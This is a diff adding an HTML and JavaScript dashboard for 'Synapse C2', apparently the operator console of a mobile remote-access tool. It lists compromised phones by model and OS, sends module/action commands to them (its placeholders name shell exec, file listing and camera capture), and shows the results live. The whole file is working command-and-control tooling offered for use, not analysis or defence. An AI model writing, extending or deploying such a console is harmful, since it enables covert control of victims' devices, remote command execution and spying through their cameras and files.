@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Synapse C2 — Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', 'Fira Code', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            min-height: 100vh;
+        }
+        .header {
+            background: #161b22;
+            border-bottom: 1px solid #30363d;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .header h1 {
+            font-size: 20px;
+            color: #58a6ff;
+            font-weight: 600;
+        }
+        .header .status {
+            font-size: 12px;
+            color: #8b949e;
+            margin-left: auto;
+        }
+        .header .dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+        }
+        .dot.online { background: #3fb950; box-shadow: 0 0 8px #3fb950; }
+        .dot.offline { background: #f85149; }
+        .container {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            height: calc(100vh - 57px);
+            gap: 0;
+        }
+        .sidebar {
+            background: #161b22;
+            border-right: 1px solid #30363d;
+            padding: 16px;
+            overflow-y: auto;
+        }
+        .sidebar h3 {
+            font-size: 14px;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+        }
+        .device-card {
+            background: #21262d;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .device-card:hover { border-color: #58a6ff; }
+        .device-card.selected { border-color: #58a6ff; background: #1c2838; }
+        .device-card .id {
+            font-size: 13px;
+            font-weight: 600;
+            color: #58a6ff;
+            word-break: break-all;
+        }
+        .device-card .info {
+            font-size: 11px;
+            color: #8b949e;
+            margin-top: 4px;
+        }
+        .device-card .status-dot {
+            display: inline-block;
+            width: 7px; height: 7px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        .main {
+            padding: 16px 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .panel {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+        }
+        .panel h3 {
+            font-size: 14px;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+        }
+        .cmd-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .cmd-row input, .cmd-row select {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            color: #c9d1d9;
+            padding: 8px 12px;
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+            outline: none;
+        }
+        .cmd-row input:focus, .cmd-row select:focus { border-color: #58a6ff; }
+        .cmd-row input { flex: 1; }
+        .cmd-row select { min-width: 160px; }
+        .btn {
+            background: #238636;
+            border: 1px solid #2ea043;
+            border-radius: 4px;
+            color: #fff;
+            padding: 8px 20px;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.15s;
+        }
+        .btn:hover { background: #2ea043; }
+        .btn:disabled { background: #21262d; border-color: #30363d; color: #484f58; cursor: not-allowed; }
+        .result-viewer {
+            height: 350px;
+            overflow-y: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 12px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 12px;
+        }
+        .result-entry {
+            padding: 8px;
+            border-bottom: 1px solid #21262d;
+            line-height: 1.5;
+        }
+        .result-entry:last-child { border-bottom: none; }
+        .result-meta {
+            color: #8b949e;
+            font-size: 11px;
+            margin-bottom: 4px;
+        }
+        .result-data {
+            color: #7ee787;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .empty-state {
+            color: #484f58;
+            text-align: center;
+            padding: 60px 20px;
+        }
+        .stats {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+        .stat {
+            background: #21262d;
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+        }
+        .stat .num { font-size: 24px; font-weight: 700; color: #58a6ff; }
+        .stat .label { font-size: 11px; color: #8b949e; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>⚡ Synapse C2</h1>
+        <span class="status"><span class="dot online"></span> Server Online</span>
+    </div>
+    <div class="container">
+        <div class="sidebar" id="sidebar">
+            <h3>📱 Devices <span id="device-count">(0)</span></h3>
+            <div id="device-list">
+                <div class="empty-state">No devices connected</div>
+            </div>
+        </div>
+        <div class="main">
+            <div class="panel">
+                <div class="stats">
+                    <div class="stat"><div class="num" id="total-devices">0</div><div class="label">Total</div></div>
+                    <div class="stat"><div class="num" id="online-devices">0</div><div class="label">Online</div></div>
+                    <div class="stat"><div class="num" id="offline-devices">0</div><div class="label">Offline</div></div>
+                </div>
+            </div>
+            <div class="panel">
+                <h3>💻 Command Console</h3>
+                <div class="cmd-row">
+                    <select id="cmd-device">
+                        <option value="">-- Select Device --</option>
+                    </select>
+                </div>
+                <div class="cmd-row">
+                    <input type="text" id="cmd-module" placeholder="Module (e.g., shell, files, camera)">
+                    <input type="text" id="cmd-action" placeholder="Action (e.g., exec, list, capture)">
+                </div>
+                <div class="cmd-row">
+                    <input type="text" id="cmd-params" placeholder="Params (JSON, e.g., {&quot;cmd&quot;:&quot;id&quot;})">
+                    <button class="btn" id="send-btn" disabled onclick="sendCommand()">▶ Send Command</button>
+                </div>
+            </div>
+            <div class="panel" style="flex:1;">
+                <h3>📋 Results</h3>
+                <div class="result-viewer" id="result-viewer">
+                    <div class="empty-state">Awaiting results...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedDevice = '';
+        let devices = {};
+
+        const API = window.location.origin;
+
+        // Poll devices every 2 seconds
+        async function pollDevices() {
+            try {
+                const res = await fetch(API + '/api/devices');
+                const data = await res.json();
+                devices = {};
+                data.devices.forEach(d => { devices[d.id] = d; });
+                renderDevices(data.devices);
+                updateStats(data.devices);
+            } catch(e) {
+                console.error('Poll error:', e);
+            }
+        }
+
+        function renderDevices(list) {
+            const container = document.getElementById('device-list');
+            const select = document.getElementById('cmd-device');
+            const countSpan = document.getElementById('device-count');
+
+            countSpan.textContent = '(' + list.length + ')';
+
+            if (list.length === 0) {
+                container.innerHTML = '<div class="empty-state">No devices connected</div>';
+                select.innerHTML = '<option value="">-- Select Device --</option>';
+                return;
+            }
+
+            container.innerHTML = '';
+            select.innerHTML = '<option value="">-- Select Device --</option>';
+
+            list.forEach(dev => {
+                // Sidebar card
+                const card = document.createElement('div');
+                card.className = 'device-card' + (dev.id === selectedDevice ? ' selected' : '');
+                card.onclick = () => selectDevice(dev.id);
+                card.innerHTML = `
+                    <span class="status-dot ${dev.online ? 'online' : 'offline'}" 
+                          style="background:${dev.online ? '#3fb950' : '#f85149'};box-shadow:${dev.online ? '0 0 8px #3fb950' : 'none'};"></span>
+                    <div class="id">${escapeHtml(dev.id)}</div>
+                    <div class="info">
+                        ${dev.info.model || 'Unknown'} | ${dev.info.os_version || '?'} | ${dev.online ? '🟢 Online' : '🔴 Offline'}
+                        ${dev.has_fcm ? ' | 📲 FCM' : ''}
+                    </div>
+                `;
+                container.appendChild(card);
+
+                // Dropdown option
+                const opt = document.createElement('option');
+                opt.value = dev.id;
+                opt.textContent = dev.id + (dev.online ? ' [Online]' : ' [Offline]');
+                if (dev.id === selectedDevice) opt.selected = true;
+                select.appendChild(opt);
+            });
+        }
+
+        function updateStats(list) {
+            const total = list.length;
+            const online = list.filter(d => d.online).length;
+            document.getElementById('total-devices').textContent = total;
+            document.getElementById('online-devices').textContent = online;
+            document.getElementById('offline-devices').textContent = total - online;
+        }
+
+        function selectDevice(id) {
+            selectedDevice = id;
+            document.getElementById('cmd-device').value = id;
+            document.getElementById('send-btn').disabled = !id;
+            // Re-render to update selection highlights
+            Object.values(devices).forEach(d => {
+                // Simple re-render
+            });
+            pollDevices();
+        }
+
+        // Listen for device dropdown changes
+        document.getElementById('cmd-device').addEventListener('change', function() {
+            selectedDevice = this.value;
+            document.getElementById('send-btn').disabled = !selectedDevice;
+        });
+
+        async function sendCommand() {
+            const deviceId = document.getElementById('cmd-device').value;
+            const module = document.getElementById('cmd-module').value.trim();
+            const action = document.getElementById('cmd-action').value.trim();
+            const paramsStr = document.getElementById('cmd-params').value.trim();
+
+            if (!deviceId || !module || !action) {
+                alert('Please fill in device, module, and action.');
+                return;
+            }
+
+            let params = {};
+            if (paramsStr) {
+                try { params = JSON.parse(paramsStr); }
+                catch(e) { alert('Invalid JSON params: ' + e.message); return; }
+            }
+
+            try {
+                const res = await fetch(API + '/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        module: module,
+                        action: action,
+                        params: params
+                    })
+                });
+                const data = await res.json();
+                if (data.command_id) {
+                    addResult({
+                        device_id: deviceId,
+                        command_id: data.command_id,
+                        data: '[Command sent: ' + module + '/' + action + ']',
+                        time: new Date().toISOString()
+                    });
+                    // Clear params after send
+                    document.getElementById('cmd-params').value = '';
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown'));
+                }
+            } catch(e) {
+                alert('Send failed: ' + e.message);
+            }
+        }
+
+        // SSE for real-time results
+        function connectSSE() {
+            const evtSource = new EventSource(API + '/api/events');
+            evtSource.onmessage = function(event) {
+                try {
+                    const result = JSON.parse(event.data);
+                    addResult(result);
+                } catch(e) {}
+            };
+            evtSource.onerror = function() {
+                // Reconnect after 3 seconds
+                setTimeout(connectSSE, 3000);
+            };
+        }
+
+        let firstResult = true;
+        function addResult(result) {
+            const viewer = document.getElementById('result-viewer');
+            if (firstResult) { viewer.innerHTML = ''; firstResult = false; }
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${escapeHtml(result.device_id)} 
+                    ${result.command_id ? ' · #' + result.command_id.substring(0,8) : ''}
+                    · ${formatTime(result.time)}
+                </div>
+                <div class="result-data">${escapeHtml(result.data)}</div>
+            `;
+            viewer.prepend(entry);
+        }
+
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        function formatTime(iso) {
+            try {
+                return new Date(iso).toLocaleTimeString();
+            } catch(e) { return iso; }
+        }
+
+        // Init
+        pollDevices();
+        setInterval(pollDevices, 2000);
+        connectSSE();
+    </script>
+</body>
+</html>
